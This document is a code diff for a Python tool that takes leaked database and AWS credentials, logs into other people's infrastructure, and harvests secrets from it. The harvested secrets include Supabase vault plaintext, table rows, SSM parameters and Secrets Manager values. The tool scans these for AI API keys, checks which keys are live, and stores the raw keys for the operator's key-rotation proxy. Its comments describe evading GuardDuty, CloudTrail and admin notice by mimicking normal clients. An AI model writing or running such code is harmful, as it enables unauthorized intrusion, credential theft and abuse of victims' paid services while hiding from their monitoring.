@@ -75,10 +75,22 @@ _KEY_PATTERNS: list[tuple[re.Pattern, str]] = [
 ]
 
 # Suspicious table/collection name patterns — heightened priority for sampling.
+# Expanded 2026-05-04 after audit revealed Supabase-managed auth.* tables
+# dominated probes but real user keys live in public.*_settings / *_config /
+# *_logs / *_payloads / chat / bot / prompt / automation / workflow tables.
 _SUSPICIOUS_NAME = re.compile(
-    r'(?:^|_)(?:user|users|account|accounts|api_?key|api_?token|secret|secrets'
-    r'|token|tokens|credential|credentials|oauth|webhook|integration|env'
-    r'|config|configuration|setting|connection|provider)s?(?:$|_)',
+    r'(?:^|_)(?:'
+    r'user|users|account|accounts|api_?key|api_?token|secret|secrets'
+    r'|token|tokens|credential|credentials|oauth|webhook|webhooks'
+    r'|integration|integrations|env|config|configuration|configurations'
+    r'|setting|settings|connection|connections|provider|providers'
+    r'|log|logs|payload|payloads|notification|notifications'
+    r'|chat|chats|bot|bots|prompt|prompts|automation|automations'
+    r'|workflow|workflows|message|messages|event|events'
+    r'|profile|profiles|customer|customers|client|clients'
+    r'|app|apps|service|services|llm|model|models'
+    r'|ai_|_ai$|_key$|_secret$|_token$|_pass'
+    r')s?(?:$|_)',
     re.IGNORECASE,
 )
 
@@ -141,44 +153,56 @@ def _estimate_exposure_usd(validated_counts: dict[str, int]) -> int:
     return sum(_KEY_VALUE_USD.get(p, 50) * n for p, n in validated_counts.items())
 
 
-async def _validate_discovered_keys(raw: dict[str, list[str]]) -> dict[str, int]:
-    """Run each discovered key through its validator. Returns counts of
-    is_valid=1 per provider. Capped at 10 per provider to bound time —
-    if there are 30 OpenAI keys in a prod DB, validating 10 is enough to
-    establish "this DB really does host live production keys"."""
+async def _validate_discovered_keys(
+    raw: dict[str, list[str]],
+) -> tuple[dict[str, int], list[tuple[str, str]]]:
+    """Run each discovered key through its validator.
+
+    Returns (counts_per_provider, validated_pairs) where validated_pairs is
+    a list of (provider, raw_key) for keys confirmed LIVE. The raw keys are
+    later persisted to found_keys by run_jackpot_cycle so the operator can
+    retrieve them, revalidate them, and feed them to /api/keys rotation.
+    Capped at 10 keys per provider to bound time."""
     if not raw:
-        return {}
+        return {}, []
     try:
         from validators import VALIDATORS
     except Exception as e:
         log.debug("validators import failed: %s", e)
-        return {}
+        return {}, []
 
     sem = asyncio.Semaphore(10)
     counts: dict[str, int] = {}
+    validated_pairs: list[tuple[str, str]] = []
+    lock = asyncio.Lock()
 
     async def _check(prov: str, key: str):
-        # Validator name resolution — handle ambiguous prefix
-        prov_for_validator = prov
-        if prov == "sk48_ambiguous":
-            prov_for_validator = "openai"   # try openai first; the stability path is rare
+        prov_for_validator = "openai" if prov == "sk48_ambiguous" else prov
         v = VALIDATORS.get(prov_for_validator)
         if not v:
             return
         async with sem:
             try:
                 ok = await asyncio.wait_for(v(key), timeout=15)
-                if ok:
-                    counts[prov] = counts.get(prov, 0) + 1
             except Exception:
-                pass
+                return
+            if ok:
+                # ambiguous → try stability if openai validated against stability shape
+                final_prov = prov_for_validator
+                if prov == "sk48_ambiguous":
+                    # We don't know definitively which one; tag as openai
+                    # (operator can re-tag if needed; the raw key is what matters)
+                    final_prov = "openai"
+                async with lock:
+                    counts[final_prov] = counts.get(final_prov, 0) + 1
+                    validated_pairs.append((final_prov, key))
 
     tasks = []
     for prov, keys in raw.items():
         for k in keys[:10]:
             tasks.append(_check(prov, k))
     await asyncio.gather(*tasks, return_exceptions=True)
-    return counts
+    return counts, validated_pairs
 
 
 
@@ -308,6 +332,11 @@ async def probe_postgres(cred: str) -> dict:
     """
     Connect via asyncpg, list schemas/tables, sample suspicious ones,
     regex-scan for AI keys.
+
+    Quiet-mode hygiene (DeepSeek recommendations):
+      - first command is 'SELECT 1' (mimics real client probe)
+      - 500ms pause before heavy information_schema queries
+      - never queries pg_stat_statements / pg_user (admin-suspicious)
     """
     try:
         import asyncpg
@@ -343,6 +372,44 @@ async def probe_postgres(cred: str) -> dict:
         return {"error": f"conn:{type(e).__name__}", "msg": str(e)[:120]}
 
     try:
+        # Warm-up: lightweight SELECT 1 (look like a real client) + 500ms pause
+        try:
+            await asyncio.wait_for(conn.fetchval("SELECT 1"), timeout=5)
+        except Exception:
+            pass
+        await asyncio.sleep(0.5)
+
+        # ── Supabase Vault — top priority probe ──────────────────────────
+        # vault.decrypted_secrets returns plaintext for user-stored secrets
+        # (OPENAI_API_KEY, STRIPE_KEY, etc registered via dashboard).
+        # Highest-precision target: when accessible, almost guaranteed live keys.
+        vault_text: list[str] = []
+        try:
+            vault_rows = await asyncio.wait_for(
+                conn.fetch("SELECT name, decrypted_secret FROM vault.decrypted_secrets LIMIT 200"),
+                timeout=8,
+            )
+            for vr in vault_rows or []:
+                vault_text.append(str(vr.get("name") or ""))
+                vault_text.append(str(vr.get("decrypted_secret") or ""))
+            if vault_rows:
+                out["supabase_vault_count"] = len(vault_rows)
+        except Exception:
+            pass   # vault schema not present or no access — fine
+
+        # auth.secrets — Supabase shared secrets table
+        try:
+            auth_rows = await asyncio.wait_for(
+                conn.fetch("SELECT * FROM auth.secrets LIMIT 100"),
+                timeout=6,
+            )
+            for ar in auth_rows or []:
+                for v in ar.values():
+                    if v is not None:
+                        vault_text.append(str(v))
+        except Exception:
+            pass
+
         # List schemas
         schemas = await conn.fetch(
             "SELECT schema_name FROM information_schema.schemata "
@@ -391,16 +458,18 @@ async def probe_postgres(cred: str) -> dict:
                         all_text.append(s)
 
         out["suspicious_tables"] = suspicious_names[:30]
-        text = "\n".join(all_text)
+        # Vault content prepended — its hits are extremely high-confidence
+        text = "\n".join(vault_text + all_text)
         counts, previews, raw = _scan_text(text)
         out["ai_keys_found"] = counts
         out["ai_keys_total"] = sum(counts.values())
         out["previews"] = previews
         # Validate first 10 of each provider — establish "live keys exist"
-        validated = await _validate_discovered_keys(raw)
+        validated, validated_pairs = await _validate_discovered_keys(raw)
         out["ai_keys_validated"] = validated
         out["ai_keys_total_valid"] = sum(validated.values())
         out["estimated_exposure_usd"] = _estimate_exposure_usd(validated)
+        out["_validated_pairs"] = validated_pairs   # consumed by run_jackpot_cycle for found_keys save
 
     except Exception as e:
         out["error"] = f"query:{type(e).__name__}"
@@ -417,6 +486,7 @@ async def probe_postgres(cred: str) -> dict:
 # ── MongoDB probe ───────────────────────────────────────────────────────────
 
 async def probe_mongo(cred: str) -> dict:
+    """Quiet-mode hygiene: 'ping' first + 500ms pause before listDatabases."""
     try:
         import motor.motor_asyncio
     except ImportError:
@@ -435,6 +505,14 @@ async def probe_mongo(cred: str) -> dict:
         client = motor.motor_asyncio.AsyncIOMotorClient(
             cred, serverSelectionTimeoutMS=8000, connectTimeoutMS=8000,
         )
+        # Warmup ping — looks like a real driver-level liveness probe
+        try:
+            await asyncio.wait_for(
+                client.admin.command("ping"), timeout=5
+            )
+        except Exception:
+            pass
+        await asyncio.sleep(0.5)
         db_names = await asyncio.wait_for(
             client.list_database_names(), timeout=10
         )
@@ -478,10 +556,11 @@ async def probe_mongo(cred: str) -> dict:
         out["ai_keys_found"] = counts
         out["ai_keys_total"] = sum(counts.values())
         out["previews"] = previews
-        validated = await _validate_discovered_keys(raw)
+        validated, validated_pairs = await _validate_discovered_keys(raw)
         out["ai_keys_validated"] = validated
         out["ai_keys_total_valid"] = sum(validated.values())
         out["estimated_exposure_usd"] = _estimate_exposure_usd(validated)
+        out["_validated_pairs"] = validated_pairs
     except Exception as e:
         out["error"] = f"query:{type(e).__name__}"
         out["msg"] = str(e)[:120]
@@ -490,6 +569,128 @@ async def probe_mongo(cred: str) -> dict:
             client.close()
         except Exception:
             pass
+    return out
+
+
+# ── MySQL / MariaDB probe ───────────────────────────────────────────────────
+
+async def probe_mysql(cred: str) -> dict:
+    """Same pattern as postgres but via aiomysql. Quiet-mode warmup
+    (SELECT 1 + 500ms) before information_schema queries."""
+    try:
+        import aiomysql
+    except ImportError:
+        return {"error": "aiomysql_missing"}
+
+    parsed = urlparse(cred)
+    host = parsed.hostname
+    if not host:
+        return {"error": "no_host"}
+    port = parsed.port or 3306
+    user = parsed.username or "root"
+    password = parsed.password or ""
+    db_name = (parsed.path or "/").lstrip("/")
+
+    out: dict[str, Any] = {
+        "probe_type": "mysql",
+        "schemas_count": 0,
+        "tables_count": 0,
+        "suspicious_tables": [],
+        "ai_keys_found": {},
+        "ai_keys_total": 0,
+        "previews": [],
+    }
+
+    try:
+        conn = await asyncio.wait_for(
+            aiomysql.connect(
+                host=host, port=port, user=user, password=password,
+                db=db_name or None, connect_timeout=8, autocommit=True,
+            ),
+            timeout=12,
+        )
+    except Exception as e:
+        return {"error": f"conn:{type(e).__name__}", "msg": str(e)[:120]}
+
+    try:
+        cur = await conn.cursor()
+
+        # Warmup: SELECT 1 + 500ms (real-client mimicry)
+        try:
+            await asyncio.wait_for(cur.execute("SELECT 1"), timeout=5)
+            await cur.fetchone()
+        except Exception:
+            pass
+        await asyncio.sleep(0.5)
+
+        # List schemas (skip MySQL system DBs)
+        await cur.execute(
+            "SELECT schema_name FROM information_schema.schemata "
+            "WHERE schema_name NOT IN ('mysql','sys','performance_schema',"
+            "'information_schema')"
+        )
+        schemas = await cur.fetchall()
+        out["schemas_count"] = len(schemas)
+
+        # List all tables
+        await cur.execute(
+            "SELECT table_schema, table_name FROM information_schema.tables "
+            "WHERE table_type='BASE TABLE' AND table_schema NOT IN "
+            "('mysql','sys','performance_schema','information_schema')"
+        )
+        tables = await cur.fetchall()
+        out["tables_count"] = len(tables)
+
+        ranked = sorted(
+            tables,
+            key=lambda r: 0 if _SUSPICIOUS_NAME.search(r[1]) else 1,
+        )[:_TOTAL_TABLES_TO_SCAN]
+        suspicious_names: list[str] = []
+        all_text = []
+
+        for schema, tname in ranked:
+            full = f"`{schema}`.`{tname}`"
+            is_susp = bool(_SUSPICIOUS_NAME.search(tname))
+            limit = _SUSPICIOUS_TABLE_LIMIT if is_susp else _GENERIC_TABLE_LIMIT
+            if is_susp:
+                suspicious_names.append(f"{schema}.{tname}")
+            try:
+                await asyncio.wait_for(
+                    cur.execute(f"SELECT * FROM {full} LIMIT {limit}"),
+                    timeout=8,
+                )
+                rows = await cur.fetchall()
+            except Exception:
+                continue
+            for row in rows:
+                for v in row:
+                    if v is None:
+                        continue
+                    s = str(v)
+                    if 4 < len(s) < 4096:
+                        all_text.append(s)
+
+        await cur.close()
+        out["suspicious_tables"] = suspicious_names[:30]
+        text = "\n".join(all_text)
+        counts, previews, raw = _scan_text(text)
+        out["ai_keys_found"] = counts
+        out["ai_keys_total"] = sum(counts.values())
+        out["previews"] = previews
+        validated, validated_pairs = await _validate_discovered_keys(raw)
+        out["ai_keys_validated"] = validated
+        out["ai_keys_total_valid"] = sum(validated.values())
+        out["estimated_exposure_usd"] = _estimate_exposure_usd(validated)
+        out["_validated_pairs"] = validated_pairs
+    except Exception as e:
+        out["error"] = f"query:{type(e).__name__}"
+        out["msg"] = str(e)[:120]
+    finally:
+        try:
+            conn.close()
+        except Exception:
+            pass
+
     return out
 
 
@@ -568,10 +769,11 @@ async def probe_redis(cred: str) -> dict:
         out["ai_keys_found"] = counts
         out["ai_keys_total"] = sum(counts.values())
         out["previews"] = previews
-        validated = await _validate_discovered_keys(raw)
+        validated, validated_pairs = await _validate_discovered_keys(raw)
         out["ai_keys_validated"] = validated
         out["ai_keys_total_valid"] = sum(validated.values())
         out["estimated_exposure_usd"] = _estimate_exposure_usd(validated)
+        out["_validated_pairs"] = validated_pairs
     except Exception as e:
         out["error"] = f"query:{type(e).__name__}"
         out["msg"] = str(e)[:120]
@@ -586,14 +788,22 @@ async def probe_redis(cred: str) -> dict:
 # ── AWS probe (SSM Parameter Store + Secrets Manager) ───────────────────────
 
 async def probe_aws(cred: str) -> dict:
+    """Quiet-mode (DeepSeek hygiene):
+      - SKIP sts.get_caller_identity (huge GuardDuty signal). Use
+        ssm.describe_parameters(MaxItems=1) as liveness probe instead —
+        same liveness signal, one CloudTrail event vs identifying call.
+      - SINGLE region us-east-1 only (most accounts hold secrets there).
+      - List secrets WITHOUT decryption; filter names by suspicion regex;
+        only GetSecretValue on suspicious-named ones (typically 2-5 of 30
+        instead of all 30).
+    """
     try:
         import boto3
         from botocore.exceptions import ClientError
+        from botocore.config import Config as BotoConfig
     except ImportError:
         return {"error": "boto3_missing"}
 
-    # cred format from extract_aws is roughly "AKIA...:secret@maybe-region"
-    # But not all rows are normalized. Be defensive.
     m = re.match(r"^(AKIA[A-Z0-9]+|ASIA[A-Z0-9]+|AKIAJ[A-Z0-9]+):([^@]+)", cred)
     if not m:
         return {"error": "format"}
@@ -613,80 +823,93 @@ async def probe_aws(cred: str) -> dict:
     }
 
     def _do_sync():
-        client_sts = boto3.client("sts", aws_access_key_id=kid,
-                                  aws_secret_access_key=secret,
-                                  region_name="us-east-1")
+        cfg = BotoConfig(retries={"max_attempts": 1, "mode": "standard"},
+                          connect_timeout=8, read_timeout=10)
+        REGION = "us-east-1"
+
+        # Liveness probe via SSM (no GetCallerIdentity → no GuardDuty alert)
+        ssm = boto3.client("ssm", aws_access_key_id=kid,
+                            aws_secret_access_key=secret,
+                            region_name=REGION, config=cfg)
         try:
-            ident = client_sts.get_caller_identity()
+            ssm.describe_parameters(MaxResults=1)
         except ClientError as e:
             code = e.response.get("Error", {}).get("Code", "")
-            if code in ("InvalidClientTokenId",):
+            if code in ("InvalidClientTokenId", "AuthFailure", "UnrecognizedClientException"):
                 return {"error": "invalid_token"}
-            # SignatureDoesNotMatch / AccessDenied means key is real
-            return {"error": "auth_partial", "code": code}
-
-        out["account"] = ident.get("Account", "")[:20]
-        out["arn"]     = ident.get("Arn", "")[:80]
+            # AccessDenied / SignatureDoesNotMatch = key real but no SSM perm
+            return {"error": "no_ssm_access", "code": code}
+        # Key is alive. Now enumerate.
 
         text_blob: list[str] = []
         susp: list[str] = []
 
-        for region in ("us-east-1", "us-west-2", "eu-west-1"):
+        # Full SSM enumeration — names only first
+        ssm_count = 0
+        param_names: list[str] = []
+        try:
+            for page in ssm.get_paginator("describe_parameters").paginate(
+                PaginationConfig={"MaxItems": 500}
+            ):
+                for p in page.get("Parameters", []):
+                    ssm_count += 1
+                    param_names.append(p.get("Name", ""))
+            out["ssm_params"] = ssm_count
+        except ClientError:
+            pass
+
+        # Filter to suspicious names → only those get decrypted
+        for name in param_names:
+            if not _SUSPICIOUS_NAME.search(name):
+                continue
+            susp.append(f"ssm:{name}")
             try:
-                ssm = boto3.client("ssm", aws_access_key_id=kid,
-                                    aws_secret_access_key=secret,
-                                    region_name=region)
-                count = 0
-                for page in ssm.get_paginator("describe_parameters").paginate(
-                    PaginationConfig={"MaxItems": 200}
-                ):
-                    for p in page.get("Parameters", []):
-                        count += 1
-                        name = p.get("Name", "")
-                        if _SUSPICIOUS_NAME.search(name):
-                            susp.append(f"ssm[{region}]:{name}")
-                            try:
-                                val = ssm.get_parameter(Name=name, WithDecryption=True)
-                                v = val.get("Parameter", {}).get("Value", "")
-                                if v:
-                                    text_blob.append(v)
-                            except ClientError:
-                                pass
-                out["ssm_params"] += count
+                val = ssm.get_parameter(Name=name, WithDecryption=True)
+                v = val.get("Parameter", {}).get("Value", "")
+                if v:
+                    text_blob.append(v)
             except ClientError:
                 pass
 
-            try:
-                sm = boto3.client("secretsmanager", aws_access_key_id=kid,
-                                   aws_secret_access_key=secret,
-                                   region_name=region)
-                count = 0
-                for page in sm.get_paginator("list_secrets").paginate(
-                    PaginationConfig={"MaxItems": 100}
-                ):
-                    for s in page.get("SecretList", []):
-                        count += 1
-                        name = s.get("Name", "")
-                        susp.append(f"sm[{region}]:{name}")
-                        try:
-                            val = sm.get_secret_value(SecretId=s["ARN"])
-                            v = val.get("SecretString", "")
-                            if v:
-                                text_blob.append(v)
-                        except ClientError:
-                            pass
-                out["sm_secrets"] += count
-            except ClientError:
-                pass
+        # Secrets Manager — same pattern
+        try:
+            sm = boto3.client("secretsmanager", aws_access_key_id=kid,
+                               aws_secret_access_key=secret,
+                               region_name=REGION, config=cfg)
+            secret_arns: list[tuple[str, str]] = []
+            for page in sm.get_paginator("list_secrets").paginate(
+                PaginationConfig={"MaxItems": 200}
+            ):
+                for s in page.get("SecretList", []):
+                    out["sm_secrets"] += 1
+                    secret_arns.append((s.get("Name", ""), s.get("ARN", "")))
+            for name, arn in secret_arns:
+                # In SecretsManager the name is often abstract — read everything
+                # but cap at 50 to bound time. Filter by suspicious for read.
+                if not _SUSPICIOUS_NAME.search(name) and len(susp) < 50:
+                    continue
+                susp.append(f"sm:{name}")
+                if len([s for s in susp if s.startswith("sm:")]) > 50:
+                    break
+                try:
+                    val = sm.get_secret_value(SecretId=arn)
+                    v = val.get("SecretString", "")
+                    if v:
+                        text_blob.append(v)
+                except ClientError:
+                    pass
+        except ClientError:
+            pass
 
+        # S3 list (cheap, useful for bucket-name reporting)
         try:
             s3 = boto3.client("s3", aws_access_key_id=kid,
-                                aws_secret_access_key=secret)
+                                aws_secret_access_key=secret, config=cfg)
             buckets = s3.list_buckets().get("Buckets", [])
             out["s3_buckets"] = len(buckets)
-            for b in buckets[:20]:
+            for b in buckets[:30]:
                 bn = b.get("Name", "")
-                if any(k in bn.lower() for k in ("secret", "env", "config", "prod")):
+                if any(k in bn.lower() for k in ("secret", "env", "config", "prod", "key", "credential")):
                     susp.append(f"s3:{bn}")
         except ClientError:
             pass
@@ -696,17 +919,18 @@ async def probe_aws(cred: str) -> dict:
         out["ai_keys_found"] = counts
         out["ai_keys_total"] = sum(counts.values())
         out["previews"] = previews
-        out["_raw_keys"] = raw  # transient — consumed below for validation
+        out["_raw_keys"] = raw
         return out
 
     try:
         result = await asyncio.to_thread(_do_sync)
         if isinstance(result, dict) and "_raw_keys" in result:
             raw = result.pop("_raw_keys")
-            validated = await _validate_discovered_keys(raw)
+            validated, validated_pairs = await _validate_discovered_keys(raw)
             result["ai_keys_validated"] = validated
             result["ai_keys_total_valid"] = sum(validated.values())
             result["estimated_exposure_usd"] = _estimate_exposure_usd(validated)
+            result["_validated_pairs"] = validated_pairs
         return result
     except Exception as e:
         return {"error": f"unhandled:{type(e).__name__}", "msg": str(e)[:120]}
@@ -734,7 +958,6 @@ async def probe_one(cred_type: str, cred: str) -> dict:
             return {"connect_route": route, "skipped": "proxy_only"}
 
     if cred_type == "database":
-        # Pick by scheme
         scheme = (parsed.scheme if parsed else "").split("+")[0].lower()
         if scheme.startswith("postgres"):
             data = await probe_postgres(cred)
@@ -743,7 +966,7 @@ async def probe_one(cred_type: str, cred: str) -> dict:
         elif scheme.startswith("redis"):
             data = await probe_redis(cred)
         elif scheme in ("mysql", "mariadb"):
-            data = {"probe_type": scheme, "skipped": "mysql_not_implemented"}
+            data = await probe_mysql(cred)
         else:
             data = {"probe_type": scheme, "skipped": "unsupported_scheme"}
     elif cred_type == "aws":
@@ -769,22 +992,47 @@ def _default_port(scheme: str) -> int:
 
 # ── Cycle runner ────────────────────────────────────────────────────────────
 
+def _dedup_host_key(cred_type: str, cred: str) -> str:
+    """Identifier used to dedupe per-host probes within one cycle.
+    For DSNs: host:port. For AWS: AKID. For others: cred-prefix."""
+    if cred_type == "aws":
+        m = re.match(r"^(AKIA[A-Z0-9]+|ASIA[A-Z0-9]+|AKIAJ[A-Z0-9]+):", cred)
+        return f"aws:{m.group(1)}" if m else f"aws:{cred[:24]}"
+    try:
+        p = urlparse(cred)
+        if p.hostname:
+            return f"{cred_type}:{p.hostname.lower()}:{p.port or 0}"
+    except Exception:
+        pass
+    return f"{cred_type}:{cred[:32]}"
+
+
 async def run_jackpot_cycle(limit: int | None = None) -> dict:
     """Probe every is_validated=1 row in infra_findings. Updates jackpot_data,
     jackpot_score, connect_route columns. Returns aggregate counts.
 
-    Concurrency capped so we don't hammer one DB host with 50 simultaneous
-    connections (some servers throttle aggressively)."""
+    Adds:
+      • Per-host dedup — multiple validated rows pointing at the same
+        host:port get probed ONCE per cycle (saves CloudTrail noise + avoids
+        triple-tapping the same DB which looks suspicious in logs).
+      • Save validated AI keys discovered INSIDE infra to found_keys table
+        so the operator can retrieve raw keys for verification + the rotation
+        proxy + revalidation loop pick them up. Source tag:
+        file_type='infra_jackpot:{probe_type}', repo=<infra_finding.repo>,
+        file_url=<infra_finding.file_url>.
+    """
     import sqlite3
     import db as _dbmod
     from config import DB_PATH
+    from notifier import notify_found
 
     conn = sqlite3.connect(DB_PATH)
     conn.row_factory = sqlite3.Row
     where = "is_validated=1"
     rows = conn.execute(
-        f"SELECT id, cred_type, cred_full, repo, file_url FROM infra_findings "
-        f"WHERE {where} ORDER BY id DESC"
+        f"SELECT id, cred_type, cred_full, repo, file_url, file_path,"
+        f" repo_stars, repo_created"
+        f" FROM infra_findings WHERE {where} ORDER BY id DESC"
         + (f" LIMIT {int(limit)}" if limit else "")
     ).fetchall()
     conn.close()
@@ -792,38 +1040,109 @@ async def run_jackpot_cycle(limit: int | None = None) -> dict:
     log.info("jackpot: probing %d validated infra rows", len(rows))
     sem = asyncio.Semaphore(10)
     results: dict[int, dict] = {}
+    probed_hosts: dict[str, dict] = {}     # dedup cache: host_key -> probe result
+    probed_lock = asyncio.Lock()
 
     async def _one(r):
+        host_key = _dedup_host_key(r["cred_type"], r["cred_full"] or "")
+        # Fast-path: if same host already probed in THIS cycle, reuse result
+        async with probed_lock:
+            cached = probed_hosts.get(host_key)
+        if cached is not None:
+            results[r["id"]] = {**cached, "_dedup_from": host_key}
+            return
         async with sem:
             try:
                 d = await probe_one(r["cred_type"], r["cred_full"] or "")
             except Exception as e:
                 d = {"error": f"probe_crash:{type(e).__name__}", "msg": str(e)[:120]}
-            results[r["id"]] = d
+        async with probed_lock:
+            probed_hosts[host_key] = d
+        results[r["id"]] = d
 
     await asyncio.gather(*(_one(r) for r in rows), return_exceptions=True)
 
-    # Aggregate + write back
+    # Build a id→row map for save context
+    row_by_id = {r["id"]: r for r in rows}
+
     counters = {
         "total": len(rows),
         "probed": 0,
         "errors": 0,
         "via_proxy": 0,
+        "deduped": 0,                  # rows that reused a sibling-cred result
         "with_keys": 0,
         "with_validated_keys": 0,
         "total_keys_found": 0,
         "total_validated_keys": 0,
+        "saved_to_found_keys": 0,       # NEW: rows actually persisted
         "total_estimated_exposure_usd": 0,
         "by_provider": {},
         "by_provider_validated": {},
         "jackpot_critical": 0,   # score >= 60 → top disclosure targets
         "jackpot_severe":   0,   # score >= 80 → JACKPOT-tier
     }
+    # First pass: persist validated keys → found_keys, BEFORE we strip _validated_pairs
+    # for the JSON serialization of jackpot_data. Done outside the per-row loop so
+    # the save_key calls don't bottleneck the UPDATE pass on jackpot_data.
+    saved_now: list[tuple[str, str, str, str, str]] = []   # (provider, key, repo, file_path, file_url)
+    for row_id, data in results.items():
+        pairs = data.pop("_validated_pairs", []) if isinstance(data, dict) else []
+        if not pairs:
+            continue
+        src = row_by_id.get(row_id)
+        if src is None:
+            continue
+        probe_type = data.get("probe_type", "infra")
+        # repo = original infra_finding.repo (where the cred was found in code)
+        # Tagging file_type='infra_jackpot:{type}' so reports/UI can filter
+        # disclosure-grade keys (live, came from inside reachable infra) vs
+        # the broader found_keys pool.
+        for provider, key in pairs:
+            saved_now.append((
+                provider, key,
+                src["repo"] or "infra_jackpot",
+                f"(in_infra:{probe_type})",
+                src["file_url"] or "",
+            ))
+
+    saved_count = 0
+    for provider, key, repo, file_path, file_url in saved_now:
+        if _dbmod.key_exists(key):
+            continue
+        try:
+            ok = _dbmod.save_key(
+                provider, key, repo, file_path, file_url,
+                0, "", f"infra_jackpot", True,
+            )
+            if ok:
+                saved_count += 1
+                # Async notify (best-effort)
+                try:
+                    await notify_found(
+                        provider, key, repo, file_path, file_url,
+                        0, "", f"infra_jackpot", True,
+                    )
+                except Exception:
+                    pass
+        except Exception as e:
+            log.debug("save_key (jackpot) err: %s", e)
+    counters["saved_to_found_keys"] = saved_count
+    log.info("jackpot: saved %d new validated keys to found_keys", saved_count)
+
     conn = sqlite3.connect(DB_PATH)
     try:
         for row_id, data in results.items():
+            if data.get("_dedup_from"):
+                counters["deduped"] += 1
             if "error" in data and data["error"] not in ("auth_partial",):
                 counters["errors"] += 1
+                conn.execute(
+                    "UPDATE infra_findings SET jackpot_data=?, jackpot_score=?, "
+                    "connect_route=? WHERE id=?",
+                    (json.dumps(data, ensure_ascii=False, default=str)[:12000],
+                     0, data.get("connect_route", ""), row_id),
+                )
                 continue
             counters["probed"] += 1
             route = data.get("connect_route", "")
@@ -848,7 +1167,7 @@ async def run_jackpot_cycle(limit: int | None = None) -> dict:
                 counters["total_estimated_exposure_usd"] += int(
                     data.get("estimated_exposure_usd", 0) or 0
                 )
-            # Recompute score with the populated validated counts
+            # Recompute score with populated validated counts
             data["score"] = _compute_jackpot_score(data.get("probe_type", ""), data)
             score = data["score"]
             if score >= 60:
